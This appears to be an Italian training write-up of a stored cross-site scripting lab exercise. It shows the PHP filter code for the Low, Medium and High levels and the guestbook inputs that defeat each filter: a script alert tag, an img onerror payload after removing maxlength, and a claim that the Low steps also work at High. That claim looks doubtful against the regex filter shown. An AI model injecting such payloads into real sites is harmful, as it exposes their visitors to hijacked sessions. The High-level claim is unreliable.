## XSS (Stored)

- https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
- https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
- https://en.wikipedia.org/wiki/Cross-site_scripting
- http://www.cgisecurity.com/xss-faq.html
- http://www.scriptalert1.com/

Lo script malevolo viene memorizzato sul server obiettivo.
Ogni volta che un utente visita la relativa pagina, riceve il codice e questo viene eseguito sul browser.

## XSS (Stored) - Low

```
// Sanitize message input
$message = stripslashes( $message ); 
```

stripslashes — Un-quotes a quoted string

Exploit:

- `Name *`: `Mallory`
- `Message *`: `Here I am! <script>alert('hacked')</script>`
- `Sign Guestbook`

## XSS (Stored) - Medium

```
// Sanitize message input
$message = strip_tags( addslashes( $message ) ); 

...

// Sanitize name input
$name = str_replace( '<script>', '', $name ); 
```

strip_tags — Strip HTML and PHP tags from a string  
addslashes — Quote string with slashes

Exploit:

- nell'html elimina l'attributo `maxlength` per il tag `<input name="txtName">`
- `Name *`: `Mallory <img src="" style="display:none" onerror=alert('hacked')>`
- `Message *`: `Here I am again!`
- `Sign Guestbook`

## XSS (Stored) - High

```
// Sanitize message input
$message = strip_tags( addslashes( $message ) );

...

// Sanitize name input
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```

Exploit: stessi passi del livello Low

